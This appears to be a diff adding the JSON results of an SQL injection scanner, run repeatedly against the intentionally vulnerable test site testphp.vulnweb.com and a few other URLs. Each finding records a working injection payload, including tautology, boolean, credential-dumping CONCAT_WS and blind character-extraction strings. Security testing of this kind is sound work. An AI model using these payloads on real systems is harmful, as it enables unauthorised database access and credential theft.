@@ -1,0 +1,624 @@
+[
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+        "timestamp": "2025-06-09 18:13:24",
+        "result": {
+            "target": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+            "vulnerabilities": [
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27",
+                    "param": "cat",
+                    "payload": "'",
+                    "category": "syntax error",
+                    "reason": "SQL error detected",
+                    "response_time": 0.62,
+                    "severity": "medium"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+OR+1%3D1--",
+                    "param": "cat",
+                    "payload": "' OR 1=1--",
+                    "category": "classic",
+                    "reason": "SQL error detected",
+                    "response_time": 0.61,
+                    "severity": "medium"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+AND+1%3D2--",
+                    "param": "cat",
+                    "payload": "' AND 1=2--",
+                    "category": "boolean-based",
+                    "reason": "SQL error detected",
+                    "response_time": 0.6,
+                    "severity": "medium"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+OR+1+GROUP+BY+CONCAT_WS%280x3a%2Cuser%2Cpassword%29--",
+                    "param": "cat",
+                    "payload": "' OR 1 GROUP BY CONCAT_WS(0x3a,user,password)--",
+                    "category": "group concat",
+                    "reason": "SQL error detected",
+                    "response_time": 0.59,
+                    "severity": "medium"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+AND+LENGTH%28user%28%29%29+%3E+1--",
+                    "param": "cat",
+                    "payload": "' AND LENGTH(user()) > 1--",
+                    "category": "information_schema",
+                    "reason": "SQL error detected",
+                    "response_time": 0.59,
+                    "severity": "medium"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+AND+ASCII%28SUBSTRING%28%28SELECT+user%28%29%29%2C1%2C1%29%29%3E64--",
+                    "param": "cat",
+                    "payload": "' AND ASCII(SUBSTRING((SELECT user()),1,1))>64--",
+                    "category": "data extraction",
+                    "reason": "SQL error detected",
+                    "response_time": 0.59,
+                    "severity": "medium"
+                }
+            ],
+            "scan_time": 0.94,
+            "payloads_used": 13,
+            "parameters_tested": [
+                "cat"
+            ]
+        }
+    },
+    {
+        "url": "https://thehackerish.com/owasp-top-10-training-how-to-install-owasp-webgoat/?id=1",
+        "timestamp": "2025-06-09 18:13:37",
+        "result": {
+            "target": "https://thehackerish.com/owasp-top-10-training-how-to-install-owasp-webgoat/?id=1",
+            "vulnerabilities": [],
+            "scan_time": 1.03,
+            "payloads_used": 13,
+            "parameters_tested": [
+                "id"
+            ]
+        }
+    },
+    {
+        "url": "https://thehackerish.com/owasp-top-10-training-how-to-install-owasp-webgoat/?id=1",
+        "timestamp": "2025-06-09 18:15:16",
+        "result": {
+            "target": "https://thehackerish.com/owasp-top-10-training-how-to-install-owasp-webgoat/?id=1",
+            "vulnerabilities": [],
+            "scan_time": 0.95,
+            "payloads_used": 13,
+            "parameters_tested": [
+                "id"
+            ]
+        }
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+        "timestamp": "2025-06-09 18:15:23",
+        "result": {
+            "target": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+            "vulnerabilities": [
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27",
+                    "param": "cat",
+                    "payload": "'",
+                    "category": "syntax error",
+                    "reason": "SQL error detected",
+                    "response_time": 0.55,
+                    "severity": "medium"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+OR+1%3D1--",
+                    "param": "cat",
+                    "payload": "' OR 1=1--",
+                    "category": "classic",
+                    "reason": "SQL error detected",
+                    "response_time": 0.6,
+                    "severity": "medium"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+AND+1%3D2--",
+                    "param": "cat",
+                    "payload": "' AND 1=2--",
+                    "category": "boolean-based",
+                    "reason": "SQL error detected",
+                    "response_time": 0.6,
+                    "severity": "medium"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+OR+1+GROUP+BY+CONCAT_WS%280x3a%2Cuser%2Cpassword%29--",
+                    "param": "cat",
+                    "payload": "' OR 1 GROUP BY CONCAT_WS(0x3a,user,password)--",
+                    "category": "group concat",
+                    "reason": "SQL error detected",
+                    "response_time": 0.6,
+                    "severity": "medium"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+AND+LENGTH%28user%28%29%29+%3E+1--",
+                    "param": "cat",
+                    "payload": "' AND LENGTH(user()) > 1--",
+                    "category": "information_schema",
+                    "reason": "SQL error detected",
+                    "response_time": 0.59,
+                    "severity": "medium"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+AND+ASCII%28SUBSTRING%28%28SELECT+user%28%29%29%2C1%2C1%29%29%3E64--",
+                    "param": "cat",
+                    "payload": "' AND ASCII(SUBSTRING((SELECT user()),1,1))>64--",
+                    "category": "data extraction",
+                    "reason": "SQL error detected",
+                    "response_time": 0.56,
+                    "severity": "medium"
+                }
+            ],
+            "scan_time": 0.93,
+            "payloads_used": 13,
+            "parameters_tested": [
+                "cat"
+            ]
+        }
+    },
+    {
+        "url": "https://example.com?id=1",
+        "timestamp": "2025-06-09 18:15:35",
+        "result": {
+            "target": "https://example.com?id=1",
+            "vulnerabilities": [],
+            "scan_time": 1.85,
+            "payloads_used": 13,
+            "parameters_tested": [
+                "id"
+            ]
+        }
+    },
+    {
+        "url": "https://example.com?id=1",
+        "timestamp": "2025-06-09 18:16:14",
+        "result": {
+            "target": "https://example.com?id=1",
+            "vulnerabilities": [],
+            "scan_time": 1.87,
+            "payloads_used": 13,
+            "parameters_tested": [
+                "id"
+            ]
+        }
+    },
+    {
+        "url": "https://example.com?id=1",
+        "timestamp": "2025-06-09 18:16:25",
+        "result": {
+            "target": "https://example.com?id=1",
+            "vulnerabilities": [],
+            "scan_time": 1.78,
+            "payloads_used": 13,
+            "parameters_tested": [
+                "id"
+            ]
+        }
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+        "timestamp": "2025-06-09 18:16:43",
+        "result": {
+            "target": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+            "vulnerabilities": [
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27",
+                    "param": "cat",
+                    "payload": "'",
+                    "category": "syntax error",
+                    "reason": "SQL error detected",
+                    "response_time": 0.61,
+                    "severity": "medium"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+OR+1%3D1--",
+                    "param": "cat",
+                    "payload": "' OR 1=1--",
+                    "category": "classic",
+                    "reason": "SQL error detected",
+                    "response_time": 0.6,
+                    "severity": "medium"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+AND+1%3D2--",
+                    "param": "cat",
+                    "payload": "' AND 1=2--",
+                    "category": "boolean-based",
+                    "reason": "SQL error detected",
+                    "response_time": 0.6,
+                    "severity": "medium"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+OR+1+GROUP+BY+CONCAT_WS%280x3a%2Cuser%2Cpassword%29--",
+                    "param": "cat",
+                    "payload": "' OR 1 GROUP BY CONCAT_WS(0x3a,user,password)--",
+                    "category": "group concat",
+                    "reason": "SQL error detected",
+                    "response_time": 0.6,
+                    "severity": "medium"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+AND+LENGTH%28user%28%29%29+%3E+1--",
+                    "param": "cat",
+                    "payload": "' AND LENGTH(user()) > 1--",
+                    "category": "information_schema",
+                    "reason": "SQL error detected",
+                    "response_time": 0.59,
+                    "severity": "medium"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+AND+ASCII%28SUBSTRING%28%28SELECT+user%28%29%29%2C1%2C1%29%29%3E64--",
+                    "param": "cat",
+                    "payload": "' AND ASCII(SUBSTRING((SELECT user()),1,1))>64--",
+                    "category": "data extraction",
+                    "reason": "SQL error detected",
+                    "response_time": 0.6,
+                    "severity": "medium"
+                }
+            ],
+            "scan_time": 0.97,
+            "payloads_used": 13,
+            "parameters_tested": [
+                "cat"
+            ]
+        }
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+        "timestamp": "2025-06-09 18:19:11",
+        "result": {
+            "target": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+            "vulnerabilities": [
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27",
+                    "param": "cat",
+                    "payload": "'",
+                    "category": "syntax error",
+                    "reason": "SQL error detected",
+                    "response_time": 0.6,
+                    "severity": "medium"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+OR+1%3D1--",
+                    "param": "cat",
+                    "payload": "' OR 1=1--",
+                    "category": "classic",
+                    "reason": "SQL error detected",
+                    "response_time": 0.6,
+                    "severity": "medium"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+AND+1%3D2--",
+                    "param": "cat",
+                    "payload": "' AND 1=2--",
+                    "category": "boolean-based",
+                    "reason": "SQL error detected",
+                    "response_time": 0.6,
+                    "severity": "medium"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+OR+1+GROUP+BY+CONCAT_WS%280x3a%2Cuser%2Cpassword%29--",
+                    "param": "cat",
+                    "payload": "' OR 1 GROUP BY CONCAT_WS(0x3a,user,password)--",
+                    "category": "group concat",
+                    "reason": "SQL error detected",
+                    "response_time": 0.58,
+                    "severity": "medium"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+AND+LENGTH%28user%28%29%29+%3E+1--",
+                    "param": "cat",
+                    "payload": "' AND LENGTH(user()) > 1--",
+                    "category": "information_schema",
+                    "reason": "SQL error detected",
+                    "response_time": 0.6,
+                    "severity": "medium"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+AND+ASCII%28SUBSTRING%28%28SELECT+user%28%29%29%2C1%2C1%29%29%3E64--",
+                    "param": "cat",
+                    "payload": "' AND ASCII(SUBSTRING((SELECT user()),1,1))>64--",
+                    "category": "data extraction",
+                    "reason": "SQL error detected",
+                    "response_time": 0.58,
+                    "severity": "medium"
+                }
+            ],
+            "scan_time": 0.93,
+            "payloads_used": 13,
+            "parameters_tested": [
+                "cat"
+            ]
+        }
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+        "timestamp": "2025-06-09 18:19:19",
+        "result": {
+            "target": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+            "vulnerabilities": [
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27",
+                    "param": "cat",
+                    "payload": "'",
+                    "category": "syntax error",
+                    "reason": "SQL error detected",
+                    "response_time": 0.6,
+                    "severity": "medium"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+OR+1%3D1--",
+                    "param": "cat",
+                    "payload": "' OR 1=1--",
+                    "category": "classic",
+                    "reason": "SQL error detected",
+                    "response_time": 0.6,
+                    "severity": "medium"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+AND+1%3D2--",
+                    "param": "cat",
+                    "payload": "' AND 1=2--",
+                    "category": "boolean-based",
+                    "reason": "SQL error detected",
+                    "response_time": 0.6,
+                    "severity": "medium"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+OR+1+GROUP+BY+CONCAT_WS%280x3a%2Cuser%2Cpassword%29--",
+                    "param": "cat",
+                    "payload": "' OR 1 GROUP BY CONCAT_WS(0x3a,user,password)--",
+                    "category": "group concat",
+                    "reason": "SQL error detected",
+                    "response_time": 0.59,
+                    "severity": "medium"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+AND+LENGTH%28user%28%29%29+%3E+1--",
+                    "param": "cat",
+                    "payload": "' AND LENGTH(user()) > 1--",
+                    "category": "information_schema",
+                    "reason": "SQL error detected",
+                    "response_time": 0.59,
+                    "severity": "medium"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+AND+ASCII%28SUBSTRING%28%28SELECT+user%28%29%29%2C1%2C1%29%29%3E64--",
+                    "param": "cat",
+                    "payload": "' AND ASCII(SUBSTRING((SELECT user()),1,1))>64--",
+                    "category": "data extraction",
+                    "reason": "SQL error detected",
+                    "response_time": 0.56,
+                    "severity": "medium"
+                }
+            ],
+            "scan_time": 0.91,
+            "payloads_used": 13,
+            "parameters_tested": [
+                "cat"
+            ]
+        }
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+        "timestamp": "2025-06-09 18:19:34",
+        "result": {
+            "target": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+            "vulnerabilities": [
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27",
+                    "param": "cat",
+                    "payload": "'",
+                    "category": "syntax error",
+                    "reason": "SQL error detected",
+                    "response_time": 0.6,
+                    "severity": "medium"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+OR+1%3D1--",
+                    "param": "cat",
+                    "payload": "' OR 1=1--",
+                    "category": "classic",
+                    "reason": "SQL error detected",
+                    "response_time": 0.6,
+                    "severity": "medium"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+AND+1%3D2--",
+                    "param": "cat",
+                    "payload": "' AND 1=2--",
+                    "category": "boolean-based",
+                    "reason": "SQL error detected",
+                    "response_time": 0.6,
+                    "severity": "medium"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+OR+1+GROUP+BY+CONCAT_WS%280x3a%2Cuser%2Cpassword%29--",
+                    "param": "cat",
+                    "payload": "' OR 1 GROUP BY CONCAT_WS(0x3a,user,password)--",
+                    "category": "group concat",
+                    "reason": "SQL error detected",
+                    "response_time": 0.59,
+                    "severity": "medium"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+AND+LENGTH%28user%28%29%29+%3E+1--",
+                    "param": "cat",
+                    "payload": "' AND LENGTH(user()) > 1--",
+                    "category": "information_schema",
+                    "reason": "SQL error detected",
+                    "response_time": 0.59,
+                    "severity": "medium"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+AND+ASCII%28SUBSTRING%28%28SELECT+user%28%29%29%2C1%2C1%29%29%3E64--",
+                    "param": "cat",
+                    "payload": "' AND ASCII(SUBSTRING((SELECT user()),1,1))>64--",
+                    "category": "data extraction",
+                    "reason": "SQL error detected",
+                    "response_time": 0.58,
+                    "severity": "medium"
+                }
+            ],
+            "scan_time": 0.92,
+            "payloads_used": 13,
+            "parameters_tested": [
+                "cat"
+            ]
+        }
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+        "timestamp": "2025-06-09 21:06:35",
+        "result": {
+            "target": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+            "vulnerabilities": [
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27",
+                    "param": "cat",
+                    "payload": "'",
+                    "category": "syntax error",
+                    "reason": "SQL error detected",
+                    "response_time": 0.78,
+                    "severity": "medium"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+OR+1%3D1--",
+                    "param": "cat",
+                    "payload": "' OR 1=1--",
+                    "category": "classic",
+                    "reason": "SQL error detected",
+                    "response_time": 0.77,
+                    "severity": "medium"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+AND+1%3D2--",
+                    "param": "cat",
+                    "payload": "' AND 1=2--",
+                    "category": "boolean-based",
+                    "reason": "SQL error detected",
+                    "response_time": 0.76,
+                    "severity": "medium"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+OR+1+GROUP+BY+CONCAT_WS%280x3a%2Cuser%2Cpassword%29--",
+                    "param": "cat",
+                    "payload": "' OR 1 GROUP BY CONCAT_WS(0x3a,user,password)--",
+                    "category": "group concat",
+                    "reason": "SQL error detected",
+                    "response_time": 0.73,
+                    "severity": "medium"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+AND+LENGTH%28user%28%29%29+%3E+1--",
+                    "param": "cat",
+                    "payload": "' AND LENGTH(user()) > 1--",
+                    "category": "information_schema",
+                    "reason": "SQL error detected",
+                    "response_time": 0.73,
+                    "severity": "medium"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+AND+ASCII%28SUBSTRING%28%28SELECT+user%28%29%29%2C1%2C1%29%29%3E64--",
+                    "param": "cat",
+                    "payload": "' AND ASCII(SUBSTRING((SELECT user()),1,1))>64--",
+                    "category": "data extraction",
+                    "reason": "SQL error detected",
+                    "response_time": 0.76,
+                    "severity": "medium"
+                }
+            ],
+            "scan_time": 1.19,
+            "payloads_used": 13,
+            "parameters_tested": [
+                "cat"
+            ]
+        }
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+        "timestamp": "2025-06-09 21:06:54",
+        "result": {
+            "target": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+            "vulnerabilities": [],
+            "scan_time": 0.35,
+            "payloads_used": 13,
+            "parameters_tested": [
+                "cat"
+            ]
+        }
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+        "timestamp": "2025-06-09 23:30:18",
+        "result": {
+            "target": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+            "vulnerabilities": [
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27",
+                    "param": "cat",
+                    "payload": "'",
+                    "category": "syntax error",
+                    "reason": "SQL error detected",
+                    "response_time": 0.6,
+                    "severity": "medium"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+OR+1%3D1--",
+                    "param": "cat",
+                    "payload": "' OR 1=1--",
+                    "category": "classic",
+                    "reason": "SQL error detected",
+                    "response_time": 0.59,
+                    "severity": "medium"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+AND+1%3D2--",
+                    "param": "cat",
+                    "payload": "' AND 1=2--",
+                    "category": "boolean-based",
+                    "reason": "SQL error detected",
+                    "response_time": 0.59,
+                    "severity": "medium"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+OR+1+GROUP+BY+CONCAT_WS%280x3a%2Cuser%2Cpassword%29--",
+                    "param": "cat",
+                    "payload": "' OR 1 GROUP BY CONCAT_WS(0x3a,user,password)--",
+                    "category": "group concat",
+                    "reason": "SQL error detected",
+                    "response_time": 0.58,
+                    "severity": "medium"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+AND+LENGTH%28user%28%29%29+%3E+1--",
+                    "param": "cat",
+                    "payload": "' AND LENGTH(user()) > 1--",
+                    "category": "information_schema",
+                    "reason": "SQL error detected",
+                    "response_time": 0.58,
+                    "severity": "medium"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+AND+ASCII%28SUBSTRING%28%28SELECT+user%28%29%29%2C1%2C1%29%29%3E64--",
+                    "param": "cat",
+                    "payload": "' AND ASCII(SUBSTRING((SELECT user()),1,1))>64--",
+                    "category": "data extraction",
+                    "reason": "SQL error detected",
+                    "response_time": 0.58,
+                    "severity": "medium"
+                }
+            ],
+            "scan_time": 0.93,
+            "payloads_used": 13,
+            "parameters_tested": [
+                "cat"
+            ]
+        }
+    }
+]
